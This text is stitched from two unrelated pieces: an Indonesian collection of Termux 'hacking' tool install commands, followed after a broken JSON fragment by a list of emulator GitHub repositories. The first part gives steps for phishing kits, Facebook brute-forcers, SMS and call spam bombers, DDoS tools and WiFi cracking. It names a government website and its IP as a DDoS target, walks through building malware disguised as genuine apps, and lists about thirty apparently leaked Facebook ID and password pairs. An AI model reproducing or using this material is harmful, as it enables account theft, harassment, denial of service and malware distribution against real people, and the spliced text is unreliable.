Kalo Ingin Direcode scnya silahkan Hak cipta Jangan Dirubah Hargai mereka coding gan Ngecoding Gk Segampang Dapettin Cinta Kamu $ pkg install update && pkg install upgrade $ apt install figlet $ apt install toilet $ gem install lolcat $ pkg install git $ git clone https://github.com/InYourG00D1/Pepescers $ cd Pepescers $ sh MTD.sh  ÷Tools ngubah Vidmax jadi Flash÷ Work 100% dicoba aja gan $ pkg install update $ pkg install upgrade $ apt install php $ pkg install git $ git clone https://github.com/InYourG00D1/Flash $ cd Flash $ php flash.php  ÷Tools Nuyul GoPay÷ $ pkg install update $ pkg install upgrade $ apt install php $ pkg install git $ git clone https://github.com/InYourG00D1/Nuyul-GoPay $ cd Nuyul-GoPay $ php Go-Pay.php  ÷Tools Install Bkp÷ Yg punya Kontol BuKan Lu doang Bwahaha Proses Install nya lumayan lama :V Kalo Mau Cepet Cari Ea Sono  $ apt update && apt upgrade $ apt install figlet $ apt install toilet $ gem install lolcat $ pkg install git $ git clone https://github.com/TumbalGanss/ToolsBkp $ cd ToolsBkp $ sh Tobat.sh  ÷Tools Installer÷ 200 tools  $ apt update && apt upgrade $ apt install figlet $ apt install toilet $ gem install lolcat $ pkg install git $ git clone https://github.com/InYourG00D1/InstallPlerN2 $ cd InstallPlerN2 $ sh InstallPlerV2.sh  ÷Tools Script Phising All÷ game,FB,Instagram $ apt update && apt upgrade $ apt install figlet $ apt install toilet $ gem install lolcat $ pkg install git $ git clone https://github.com/InYourG00D1/scPH1S1N9 $ cd scPH1S1N9 $ sh PhisingV2.sh  #shareMhank #nomor Yg ada Di Tools Udh Gk Aktif #Ini New Nomer nya : 0895805133060  https://chat.whatsapp.com/Cj0VpOmWpQBJUEQZqqOLn3  [+] Site Title: MyGOV - The Government of Malaysia's Official Portal [+] IP address: 150.242.182.57 [+] Web Server: Apache [+] CMS: Could Not Detect [+] Cloudflare: Not Detected [+] Robots File: Could NOT Find robots.txt!  TARGET IP=150.242.182.57  PORT:80   TARGET WEB=malaysia.gov.my   HARI INI 16-APRIL-2019 JAM 15.00 WIB   TOOL ATTACK?  -=NEW TOOL=- ================= Win32 attack ================= apt install git apt install python apt install bash apt install toilet apt install lolcat git clone https://github.com/BPCATTACKER/DOS-TOOKITS cd DOS-TOOKITS sh DoS-TOOKIT.sh  APA YG BARU? -PERBAIKAN ERROR SAAT MENGIRIM PACKET ATTACK -DLL  ================ DDOS BPC http://github.com/BLACK-PHANTOM-CYBER/DDOS-BPC/ cd DDOS-BPC python2 SPOONDDOS.sh =================== Ingat sebelum attack harus cek ip dulu karena ip bisa berubah-ubah Dgn cara Ketik di termux  ping malaysia.gov.my  Salam NASIONAL CYBER ASOSSIATION   LEBIH BAIK MENCOBA DAN GAGAL DARI PD TIDAK MENCOBA SAMA SEKALI   YG SEBAR GW DOAIN DAPAT PAHALA DAPAT PAHALA  Spam Call Unlimited $ pkg update && pkg upgrade $ pkg install php $ pkg install git $ git clone https://github.com/Aditya021/SpamCall $ cd SpamSms $ php SpamCall.php Masukan No Target ===> Mode Banyak (y/n) ===> UNTUK Spam Lebih Dari 1 JumlahSpam ===> Masukan Jumlah yang ingin dispam🙏🙏🙏🎭🎭🇲🇨  Siapa tau ada yang mau nih sc Cara install tool Mr.Rv1.1 $apt update && apt upgrade $pkg install git $pkg install gem $pkg install figlet $gem install lolcat $git clone https://github.com/Mr-R225/Mr.Rv1.1 $cd Mr.Rv1.1 $sh Mr.Rv1.1.sh  tool install $ apt update && apt upgrade $ apt install git $ git clone https://github.com/aryanrtm/4wsectools cd 4wsectools chmod 777 tools ./tools  TOOL FSOCIETY $ git clone https://github.com/manisso/fsociety $ cd fsociety $ ./install.sh $ ls $ python2 fsociety.py  Assalamualaikum wr.wb Ni gw bagi SC DARK-FB(VIP-VPRO) & Gw bagi2 akun FB untuk kalian   Ni scripst HACK FB NEWW  (VIP.VPRO) NO LISENSI ∞∞∞≠BY MR.M4RCH3LL≠∞∞∞  $ pkg update && pkg upgrade $ pkg install git $ pkg install python2 $ pkg install mechanize $ pkg install request $ git clone https://github.com/m4rche3ll-cyber/dark-vpro $ cd dark-vpro $ python2 dark-vpro.py  NI akun FB untuk kalian smua  [OK✓] 100037694627558 | Syla12345 [✓] 100037988325303 | Feri123 [✓] 100037977879771 | Rifaa123  [OK✓] 100037091885666 | Sutris12345 [OK✓] 100037229983265 | Kahfi123  [OK✓] 100037166443432 | Munir123 [OK✓] 100037216997895 Nawawi123 [OK✓] 100037665398302 | Ponatim123 [OK✓] 100037974392506 | Andri123 [OK✓] 100037679447951 | Andika123 [✓] 100037946790741 | Sutres123 [✓] 100038002561349 | Aghni123 [✓] 100038113410131 | Blaster123 [✓] 100037710525968 | Noffal123 [✓] 100037988325303 | Feri123 [✓] 100037590739244 | Agus123 [✓] 100037576672206 | Kenyot123 [✓] 100037974392506 | Andri123 [OK✓] 100037714800465 | Dafa123 [OK✓] 100037869518631 | Ervan123 [OK✓] 100037354215333 Tans12345 [OK✓] 100037553282746 | Rifal123 [OK✓] 100037114456712 | Afif12345 [OK✓] 100037388647024 | Doni123 OK✓] 100037155800753 | Ikna123 [OK✓] 100037360233177 | Udin123 [OK✓] 100037089379481 | Dafa123 [OK✓] 100037388887005 Ridwan123 OK✓] 100037199269083 | Rifki123 [OK✓] 100037446305432 | Bima123  Gunakan dengan bijak !!!  Kalau kalian ingin tanya lebih / ada masalah Kalian bisa wa saya  No wa ADA DI SC NYA/ komen di bawah  Jangan lupa SUBSCRIBE (FREE) ,agar channel ini berkembang ,,& juga we akan membuat sc2 yang bermanfaat bagi kalian semua   Link grup wa : https://chat.whatsapp.com/KxTHh6xi9OgEEl41UDURE9  Oke , terimakasih:)  Wassalamu'alaikum wr.wb    Aldaynoobz  Selasa, 23 April 2019  Script-Termux                        We are anonymous                            We are legion                        We do not forgive                         We do not forget                                Expect us   ￼     DDOS ATTACK (TROJAN)  $ apt install git $ apt install python $ apt install bash $ apt install toilet $ apt install lolcat $ git clone https://github.com/BPCATTACKER/DOS-TOOKITS $ cd DOS-TOOKITS $ sh DoS-TOOKIT.sh  pilih no 1 lalu enter, lalu masukkan ip target dan enter attack sedang berjalan!  DDOS ATTACK  $  pkg update $  pkg upgrade $  pkg install python $  pkg install git $  git clone https://github.com/cyweb/  hammer $  cd hammer $  python hammer.py $  python3 hammer.py -s(ipnya cari sendiri di IP CHACKER) -p 80 -t 135   BOBOL-WIFI( root)  $ apt update && apt upgrade $ pkg install git $ git clone https://github.com/esc0rtd3w/wifi-hacker $ cd wifi-hacker/ $ chmod +x wifi-hacker.sh $ ./wifi-hacker.sh   HACK CCTV $ pkg update  $ pkg upgrade -y  $ pkg install python2 $ pkg install git  $ git clone https://github.com/GUNAWAN18ID/cctv.git  $ pip2 install requests  $ cd cctv  $ python2 scanner.py   SPAM CALL   $ pkg update $ pkg upgrade $ pkg install git $ pkg install python2 $ git clone https://github.com/MRRUXHANTAC270/RUXH4N_SPAM $ cd RUXH4N_SPAM $ python2 RUXH4N_SP4M.py8  Pilih nomor target jangan lupa pake (+62) ===>> +6285xxxxx Pilih jumlah spam ====>>>misal:100 Done :v  DEFACE WEBDAV  $  pkg update && pkg upgrade $  pkg install bash $  pkg install git $  pip2 install termocolor $  pip2 install lolcat $  git clone https://github.com/MRRUXHANTAC270/Deface-W3BD4F $  cd Deface-W3BD4F $  sh Webdav.sh  Masukan script html     Lalu pilih web vulnya >:)                  Cek               👇🏻👇🏻👇🏻  $apt install python2 $apt install git $apt install php $apt install bash $apt install nano $apt install toilet $git clone https://github.com/MRRUXHANTAC270/cek $cd cek $ls $sh cek.sh  HACK FACEBOOK TARGET  $pkg update && pkg upgrade $pkg install python2 $pkg install git $git clone https://github.com/MRRUXHANTAC270/Facebook-target $cd Facebook-target $python2 fb.py  SILAHKAN DOWNLOAD WORD LIST NYA TERLEBIH DAHULU https://sfile.mobi/4UugtYlifYk  Masukin id target ...  Lalu klik /sdcard/password.txt  SCRIPT DEFACE  $apt update && apt upgrade $apt install python2 $apt install git $apt install php $apt install bash $apt install nano $apt install toilet $git clone https://github.com/MRRUXHANTAC270/scriptdeface $  cd scriptdeface $  python2 now.py  SPAM WHATSAPP  $  apt update && apt upgrade $  apt install python2 $  apt install git $  apt install php $  apt install bash $  git clone https://github.com/MRRUXHANTAC270/sp4m $  cd sp4m $  php wa.php   Memper Cantik/Melihat V.Android Termux $ pkg update && pkg upgrade $ pkg install ruby cowsay toilet figlet $ pkg install neofetch $ pkg install nano $ gem install lolcat  $ cd ../usr/etc $ nano bash.bashrc cowsay -f eyes Cyber | lolcat toilet -f standard Indonesia -F gay neofetch date | lolcat ✓ Hack FB rombongan $ apt update && apt upgrade $ pkg install python2 git $ pip2 install mechanize $ git clone http://github.com/pirmansx/mbf $ ls $ cd mbf $ python2 MBF.py ✓ Hack FB ngincer $ apt update ( Enter ) $ apt upgrade ( Enter ) $ apt install python2 ( Enter ) $ pip2 install urllib3 chardet certifi idna requests ( Enter ) $ apt install openssl curl ( Enter ) $ pkg install libcurl ( Enter ) $ ln /sdcard ( Enter )  $ cd /sdcard ( Enter ) $ python2 fbbrute.py ( Enter ) ✓ Hack Gmail $ apt-get update && apt-get upgrade $ apt-get install git $ apt-get install python python-pip python-setuptools $ pip install scapy $ git clone https://github.com/wifiphisher/wifiphisher.git $ cd wifiphisher< $ python setup.py install $ cd wifiphisher $ python wifiphisher  Nih yang mau hack WiFi Khusus root $apt update $apt upgrade $apt install git $git clone https://github.com/esc0rtd3w/wifi-hacker $ls $cd wifi-hacker $ls $chmod +x wifi-hacker.sh $ls $./wifi-hacker.sh  cara uninstall tool termux  rm -rf toolsnya   Bermain moon-buggy $ pkg install moon-buggy $ moon-buggy  CHATTING VIA TERMUX irssi /connet irc.freenode.net /nick w3wandroid /join #modol   $ pkg install irssi $ irssi $ /connect chat.freenode.net $ /nick 1235 12345 di ganti sesuai nama/nick agan $ /join #XCAteam   PERKIRAAN cuaca curl http://wttr.in/ (lokasi)    Browsing di termux $ pkg install w3m $ w3m www.google.com Linknya bsa diubah   Telephone di termux $ pkg install termux-api $ termux-telephony-call nomornya   Menampilkan animasi kereta :v $ pkg install sl $ sl menampilkan ikon dan informasi sistem android $ pkg install neofetch $ neofetch  menampilkan teks dalam format ASCII $ pkg install figlet $ figlet masukin teksnya   MEMUTAR MUSIC DI YOUTUBE VIA TERMUX $ pip install mps_youtube $ pip install youtube_dl $ apt install mpv $ mpsyt $ /judul lagu Tinggal pilih lagu dengan mengetik nomornya  musikan di termux $ pkg install mpv  $ mpv/sdcard/lagu.mp3  /sdcard/ bisa di ganti sesuai letak music    CRACK PASSWORD HASH $ git clone https://github.com/FajriHidayat088/FHX-Hash-Killer/ $ cd FHX-Hash-Killer $ python2 FHXHashKiller.py  $ git clone https://github.com/UltimateHackers/Hash-Buster $ cd Hash-Buster $ python2 hash.py  ASCII ART MAPS - pkg install update && upgrade - pkg install perl - git clone https://github.com/x-xsystm/maps.git - cd kaos - perl maps.pl - untuk Zoom tekan A - Password: (pejuang212)   CARA MENGHIAS TAMPILAN TERMUX $ pkg update && pkg upgrade $ pkg install ruby cowsay toilet figlet $ pkg install neofetch $ pkg install nano $ pkg install ncurses-utils $ pkg install ruby $ pkg install lolcat $ pkg install cowsay $ gem install lolcat $ nano .bashrc  clear blue='\\e[1;34m' green='\\e[1;32m' purple='\\e[1;35m' cyan='\\e[1;36m' red='\\e[1;31m' white='\\e[1;37m' yellow='\\e[1;33m' NOW=`date \"+%d.%m.%Y\"` TIME=`date \"+%H:%M\"` cowsay -f eyes *Welcome To MRCX hacking tool* | lolcat toilet -f standard \" *MRCX* \" -F gay neofetch echo \" Time : \" $TIME | lolcat date | lolcat echo echo Username : marcyber team | lolcat echo Hostname : @MRCX~#root_system | lolcat echo echo @localhost:~# | lolcat echo root@localhost:~$ | lolcat echo -e $green echo root@MRCX:~$   TUTORIAL MEMBUAT VIRUS SEPERTI APLIKASI ASLINYA  Tools yang dibutuhkan: APK Editor & tool vbug APK Editor bisa didownload di playstore Tool vbug https://www.mediafire.com/file/6hs6y71ryw10uvw/vbug.zip 1. Download tool vbugnya dulu 2. Taruh file tool vbug di luar folder pada memori internal 3. Buka termux lalu $ cd /sdcard 4. $ unzip vbug.zip 5. $ cd vbug 6. $ python2 vbug.py 7. Enter 8. Ketik 10 9. Ketik E 10. Aplikasi virusnya sudah jadi Setelah aplikasinya jad kita tinggal edit supaya mirip aslinya 1. Buka APK Editor 2. Klik Select an Apk File 3. Pilih aplikasi virus tadi 4. Klik full edit 5. Pada bagian kolom app_name tulis nama aplikasi yang kalian inginkan 6. Lalu klik files 7. Klik res/drawable 8. Logo yang kedua itu ganti dengan logo aplikasi yang kalian inginkan Catatan: format logo harus .png 9. Ceklist logo yang kedua lalu replace 10. Pilih file logo yang mau dijadikan logo aplikasi agan 11. Back sampai home Supaya aplikasi terlihat lebih nyata kita harus beri bobot pada aplikasi buatan kita 12. Klik tanda plus yang ada di bawah kiri, pilih file, lagu, gambar atau apapun yang coxok sebagai bobot apliaksi agan 13. Klik build 14. Tunggu hingga selesai 15. Jadi deh  VBugMaker Termux -apt update && apt upgrade -apt install git -apt install python Donwload file ->http://upfile.mobi/YGwg8gQLuvv Pindah ke directory Next -unzip vbug.zip -mv vbug $HOME -cd vbug -ls -chmod +x vbug.py -python2 vbug.py #Done    BOOM SPAM DI TERMUX apt upgrade && apt update apt install git  git clone https://github.com/Amriez/gcospam cd gcospam sh install.sh sh gco.sh Pilih nomer yang mana ajjh  Lalu Masukan nomer tanpa 0/62 Input bebas Jeda default aja  Spam bom mall $ pkg install update  $ pkg install upgrade $ pkg install wget $ pkg install php $ wget http://files-store.theprivat.ml/uploads/bom-mall.zip $ unzip bom-mall.zip $ cd bom-mall $ php run.php  (Install SpamTsel) $ pkg install curl  $ pkg install php  $ curl -s http://files-store.theprivat.ml/uploads/bombtsel.txt > bombtsel.php  $ chmod 777 bombtsel.php $ php bombtsel.php 3) Tool Spam LITESPAM $ pkg install php $ pkg install toilet $ pkg install sh  LITESPAM $ pkg install git $ git clone https://github.com/4L13199/LITESPAM $ cd LITESPAM $ sh LITESPAM.sh atau  bash LITESPAM.sh Masukan Nomer nya...   Spammer GRAB $pkg install python2 $pip2 install requests $pkg install git $git clone http://github.com/p4kl0nc4t/Spammer-Grab $cd Spammer-Grab $python2 spammer.py nomor hp korban --delay 30  spam sms jdid 1.PKG install PHP 2.pkg install cURL 3.curl https://pastebin.com/raw/9BYy1 JVc -o jdid.php 4.php jdid.php   Hacking spammer by seni $apt update && apt upgrade $apt install python2 php $pip2 install requests $apt install nano $apt install git $git clone https://github.com/Senitopeng/ SpamSms.git $cd SpamSms $python2 mantan.py   HACKING DAN TRICK FB VIA TERMUX   AUTO BOOT FACEBOOK  $ git clone https://github.com/Senitopeng/BotFbBangDjon.git $ cd BotFbBangDjon $ python2 bangdjon.py  Cara crack id fb  https://findmyfbid.in/  git clone https://github.com/tomiashari/fb-autoreaction.git cd fb-autoreaction python2 fb-autoreaction  HACKING THOOLS MBF FACEBOOK $ pkg update && upgrade ‬$ pkg update && upgrade $ pkg install python2 $ pkg install git $ git clone https://github.com/pirmansx/mbf $ cd mbf $ python2 MBF.py  (HACKING FB LEWAT TERMUX) $ apt update $ apt upgrade  $ apt install python2 $ apt install python2-dev $ apt install wget $ dip2 install mechanize $ cd/sterage/emulated/0 $ python2 fbbrute.py ( yg tdi di download di tunda di luar folder )  Mungkin itu saja yang dapat saya bagikan, jika ada yang salah saya mohon maaf. Ingin Ikut Team Kami ? Klik Disini Website Team ? Klik Disini Website Umum ? Klik Disini  Di Atas Langit Masih Ada Langit Jadi, Jangan Sok Berkuasa Belum Tentu Anda Lebih Baik Dari Kami #WeDoNotForget #WeDoNotForgive #ExpectUs  Landy22  Salam Hangat,"
+  },
+  {
+    "name": "boytacean",
+    "slug": "boytacean",
+    "creator": "joamag",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/joamag/boytacean",
+    "cover": "https://avatars.githubusercontent.com/u/25441?v=4",
+    "description": "A GB emulator that is written in Rust 🦀!"
+  },
+  {
+    "name": "potatis",
+    "slug": "potatis",
+    "creator": "henrikpersson",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/henrikpersson/potatis",
+    "cover": "https://avatars.githubusercontent.com/u/697699?v=4",
+    "description": "🥔 MOS-6502 and NES emulator in Rust (SDL/WebAssembly/Android/Embedded/Cloud)"
+  },
+  {
+    "name": "php-terminal-nes-emulator",
+    "slug": "php-terminal-nes-emulator",
+    "creator": "hasegawa-tomoki",
+    "version": "...",
+    "console": "Nintendo Entertainment System",
+    "url": "https://github.com/hasegawa-tomoki/php-terminal-nes-emulator",
+    "cover": "https://avatars.githubusercontent.com/u/3850359?v=4",
+    "description": "A PHP terminal NES emulator"
+  },
+  {
+    "name": "daedalus",
+    "slug": "daedalus",
+    "creator": "DaedalusX64",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/DaedalusX64/daedalus",
+    "cover": "https://avatars.githubusercontent.com/u/48574513?v=4",
+    "description": "The Nintendo 64 Emulator itself"
+  },
+  {
+    "name": "PicoMemcard",
+    "slug": "picomemcard",
+    "creator": "dangiu",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/dangiu/PicoMemcard",
+    "cover": "https://avatars.githubusercontent.com/u/5966597?v=4",
+    "description": "Emulating PSX Memory Card (or controller) using a Raspberry Pi Pico"
+  },
+  {
+    "name": "xqemu",
+    "slug": "xqemu",
+    "creator": "xqemu",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/xqemu/xqemu",
+    "cover": "https://avatars.githubusercontent.com/u/13059056?v=4",
+    "description": "Open-source emulator to play original Xbox games on Windows, macOS, and Linux"
+  },
+  {
+    "name": "N64Wasm",
+    "slug": "n64wasm",
+    "creator": "nbarkhina",
+    "version": "...",
+    "console": "Nintendo 64",
+    "url": "https://github.com/nbarkhina/N64Wasm",
+    "cover": "https://avatars.githubusercontent.com/u/10982154?v=4",
+    "description": "A web based N64 Emulator"
+  },
+  {
+    "name": "ageLANServer",
+    "slug": "agelanserver",
+    "creator": "luskaner",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/luskaner/ageLANServer",
+    "cover": "https://avatars.githubusercontent.com/u/1903842?v=4",
+    "description": "Web Server (and its launcher) for AoE 1, 2, 3 (all DE), AoE 4 and AoM: RT supporting offline multiplayer"
+  },
+  {
+    "name": "rustendo64",
+    "slug": "rustendo64",
+    "creator": "yupferris",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/yupferris/rustendo64",
+    "cover": "https://avatars.githubusercontent.com/u/3166056?v=4",
+    "description": "Livecoding a Nintendo 64 emulator in Rust :D"
+  },
+  {
+    "name": "roms",
+    "slug": "roms",
+    "creator": "86Box",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/86Box/roms",
+    "cover": "https://avatars.githubusercontent.com/u/35927955?v=4",
+    "description": "ROMs for the 86Box emulator. For development versions of 86Box, the recommended way to use this repository is to clone it instead of downloading the tagged releases."
+  },
+  {
+    "name": "rustboyadvance-ng",
+    "slug": "rustboyadvance-ng",
+    "creator": "michelhe",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/michelhe/rustboyadvance-ng",
+    "cover": "https://avatars.githubusercontent.com/u/2903914?v=4",
+    "description": "RustBoyAdvance-NG is a Nintendo™ Game Boy Advance emulator and debugger, written in the rust programming language."
+  },
+  {
+    "name": "emularity",
+    "slug": "emularity",
+    "creator": "db48x",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/db48x/emularity",
+    "cover": "https://avatars.githubusercontent.com/u/228849?v=4",
+    "description": "easily embed emulators"
+  },
+  {
+    "name": "utmconfigs",
+    "slug": "utmconfigs",
+    "creator": "adespoton",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/adespoton/utmconfigs",
+    "cover": "https://avatars.githubusercontent.com/u/4846661?v=4",
+    "description": "Config files for booting Mac OS 7-9, OS X and macOS on UTM emulator"
+  },
+  {
+    "name": "WinVisor",
+    "slug": "winvisor",
+    "creator": "x86matthew",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/x86matthew/WinVisor",
+    "cover": "https://avatars.githubusercontent.com/u/111854665?v=4",
+    "description": "WinVisor - A hypervisor-based emulator for Windows x64 user-mode executables using Windows Hypervisor Platform API"
+  },
+  {
+    "name": "NexusForever",
+    "slug": "nexusforever",
+    "creator": "NexusForever",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/NexusForever/NexusForever",
+    "cover": "https://avatars.githubusercontent.com/u/46006012?v=4",
+    "description": "An emulator for the defunct MMORPG WildStar which supports build 16042 (Final Patch)"
+  },
+  {
+    "name": "konsole",
+    "slug": "konsole",
+    "creator": "KDE",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/KDE/konsole",
+    "cover": "https://avatars.githubusercontent.com/u/14312869?v=4",
+    "description": "Terminal emulator by KDE"
+  },
+  {
+    "name": "diyHue",
+    "slug": "diyhue",
+    "creator": "mariusmotea",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/mariusmotea/diyHue",
+    "cover": "https://avatars.githubusercontent.com/u/5594370?v=4",
+    "description": "Philips Hue emulator that is able to control multiple types of lights"
+  },
+  {
+    "name": "jsnes-web",
+    "slug": "jsnes-web",
+    "creator": "bfirsh",
+    "version": "...",
+    "console": "Nintendo Entertainment System",
+    "url": "https://github.com/bfirsh/jsnes-web",
+    "cover": "https://avatars.githubusercontent.com/u/40906?v=4",
+    "description": "A browser UI for JSNES, a JavaScript NES emulator"
+  },
+  {
+    "name": "xterm.dart",
+    "slug": "xterm-dart",
+    "creator": "TerminalStudio",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/TerminalStudio/xterm.dart",
+    "cover": "https://avatars.githubusercontent.com/u/68649507?v=4",
+    "description": "💻 xterm.dart is a fast and fully-featured terminal emulator for Flutter, with support for mobile and desktop platforms."
+  },
+  {
+    "name": "CAMLBOY",
+    "slug": "camlboy",
+    "creator": "linoscope",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/linoscope/CAMLBOY",
+    "cover": "https://avatars.githubusercontent.com/u/24925588?v=4",
+    "description": "A Game Boy emulator written in OCaml that runs in your browser 🐫 🎮"
+  },
+  {
+    "name": "dtach",
+    "slug": "dtach",
+    "creator": "crigler",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/crigler/dtach",
+    "cover": "https://avatars.githubusercontent.com/u/8346145?v=4",
+    "description": "A simple program that emulates the detach feature of screen"
+  },
+  {
+    "name": "docker-emulatorjs",
+    "slug": "docker-emulatorjs",
+    "creator": "linuxserver",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/linuxserver/docker-emulatorjs",
+    "cover": "https://avatars.githubusercontent.com/u/12324908?v=4",
+    "description": "Web based retro emulation frontend with rom scanning and automated art ingestion. "
+  },
+  {
+    "name": "freej2me",
+    "slug": "freej2me",
+    "creator": "hex007",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/hex007/freej2me",
+    "cover": "https://avatars.githubusercontent.com/u/1689246?v=4",
+    "description": "A free J2ME emulator with libretro, awt and sdl2 frontends."
+  },
+  {
+    "name": "TrollNFC",
+    "slug": "trollnfc",
+    "creator": "OwnGoalStudio",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/OwnGoalStudio/TrollNFC",
+    "cover": "https://avatars.githubusercontent.com/u/176883745?v=4",
+    "description": "A versatile tool for reading, writing, managing, and emulating NFC cards on your iPhone."
+  },
+  {
+    "name": "GameBoy-Online",
+    "slug": "gameboy-online",
+    "creator": "taisel",
+    "version": "...",
+    "console": "Game Boy",
+    "url": "https://github.com/taisel/GameBoy-Online",
+    "cover": "https://avatars.githubusercontent.com/u/13305116?v=4",
+    "description": "JavaScript GameBoy Color emulator."
+  },
+  {
+    "name": "ELM327-emulator",
+    "slug": "elm327-emulator",
+    "creator": "Ircama",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/Ircama/ELM327-emulator",
+    "cover": "https://avatars.githubusercontent.com/u/8292987?v=4",
+    "description": "ELM327 Emulator for testing software interfacing OBDII via ELM327 adapter supporting multi-ECU simulation"
+  },
+  {
+    "name": "Spice86",
+    "slug": "spice86",
+    "creator": "OpenRakis",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/OpenRakis/Spice86",
+    "cover": "https://avatars.githubusercontent.com/u/96645433?v=4",
+    "description": "Reverse engineer and rewrite real mode DOS programs! "
+  },
+  {
+    "name": "picsimlab",
+    "slug": "picsimlab",
+    "creator": "lcgamboa",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/lcgamboa/picsimlab",
+    "cover": "https://avatars.githubusercontent.com/u/13749258?v=4",
+    "description": "PICSimLab - Programmable IC Simulator Laboratory"
+  },
+  {
+    "name": "awesome-emulators",
+    "slug": "awesome-emulators",
+    "creator": "DerekTurtleRoe",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/DerekTurtleRoe/awesome-emulators",
+    "cover": "https://avatars.githubusercontent.com/u/3183676?v=4",
+    "description": "An awesome list of emulators!"
+  },
+  {
+    "name": "AutoVirt",
+    "slug": "autovirt",
+    "creator": "Scrut1ny",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/Scrut1ny/AutoVirt",
+    "cover": "https://avatars.githubusercontent.com/u/53458032?v=4",
+    "description": "Automated Linux virtualization scripts for advanced malware analysis."
+  },
+  {
+    "name": "esp32-nesemu",
+    "slug": "esp32-nesemu",
+    "creator": "espressif",
+    "version": "...",
+    "console": "Nintendo Entertainment System",
+    "url": "https://github.com/espressif/esp32-nesemu",
+    "cover": "https://avatars.githubusercontent.com/u/9460735?v=4",
+    "description": "Proof-of-concept NES emulator for the ESP32"
+  },
+  {
+    "name": "x86-64-playground",
+    "slug": "x86-64-playground",
+    "creator": "robalb",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/robalb/x86-64-playground",
+    "cover": "https://avatars.githubusercontent.com/u/11277482?v=4",
+    "description": "An online assembly editor, emulator and debugger for the x86-64 architecture"
+  },
+  {
+    "name": "ErlangRT",
+    "slug": "erlangrt",
+    "creator": "kvakvs",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/kvakvs/ErlangRT",
+    "cover": "https://avatars.githubusercontent.com/u/288724?v=4",
+    "description": "Erlang Replacement Therapy. Another attempt to make Erlang runtime (BEAM emulator) in Rust. Good news: I know what to do. Bad news: I have no clue how to Rust"
+  },
+  {
+    "name": "unicorn.js",
+    "slug": "unicorn-js",
+    "creator": "AlexAltea",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/AlexAltea/unicorn.js",
+    "cover": "https://avatars.githubusercontent.com/u/5306886?v=4",
+    "description": "Unicorn CPU emulator framework port for JavaScript"
+  },
+  {
+    "name": "felix86",
+    "slug": "felix86",
+    "creator": "OFFTKP",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/OFFTKP/felix86",
+    "cover": "https://avatars.githubusercontent.com/u/21157395?v=4",
+    "description": "Run x86 and x86-64 games on RISC-V Linux"
+  },
+  {
+    "name": "eden-emulator.github.io",
+    "slug": "eden-emulator-github-io",
+    "creator": "eden-emulator",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/eden-emulator/eden-emulator.github.io",
+    "cover": "https://avatars.githubusercontent.com/u/205540286?v=4",
+    "description": "Eden's Website"
+  },
+  {
+    "name": "binjgb",
+    "slug": "binjgb",
+    "creator": "binji",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/binji/binjgb",
+    "cover": "https://avatars.githubusercontent.com/u/1245315?v=4",
+    "description": "Gameboy emulator implemented in C, that also runs in the browser"
+  },
+  {
+    "name": "piscsi",
+    "slug": "piscsi",
+    "creator": "PiSCSI",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/PiSCSI/piscsi",
+    "cover": "https://avatars.githubusercontent.com/u/118204717?v=4",
+    "description": "PiSCSI allows a Raspberry Pi to function as emulated SCSI devices (hard disk, CD-ROM, and others) for vintage SCSI-based computers and devices. This is a fork of the RaSCSI project by GIMONS. "
+  },
+  {
+    "name": "minivmac4ios",
+    "slug": "minivmac4ios",
+    "creator": "zydeco",
+    "version": "...",
+    "console": "iOS",
+    "url": "https://github.com/zydeco/minivmac4ios",
+    "cover": "https://avatars.githubusercontent.com/u/158216?v=4",
+    "description": "Mini vMac for iOS"
+  },
+  {
+    "name": "emulator101",
+    "slug": "emulator101",
+    "creator": "kpmiller",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/kpmiller/emulator101",
+    "cover": "https://avatars.githubusercontent.com/u/689200?v=4",
+    "description": "Source code to all the tutorials on emulator101.com"
+  },
+  {
+    "name": "worldwide",
+    "slug": "worldwide",
+    "creator": "akatsuki105",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/akatsuki105/worldwide",
+    "cover": "https://avatars.githubusercontent.com/u/37920078?v=4",
+    "description": "This is my OLD and BAD GameBoy Emulator, please visit DawnGB, my new GameBoy emulator!"
+  },
+  {
+    "name": "sumi-emu",
+    "slug": "sumi-emu",
+    "creator": "ovsky",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/ovsky/sumi-emu",
+    "cover": "https://avatars.githubusercontent.com/u/37027844?v=4",
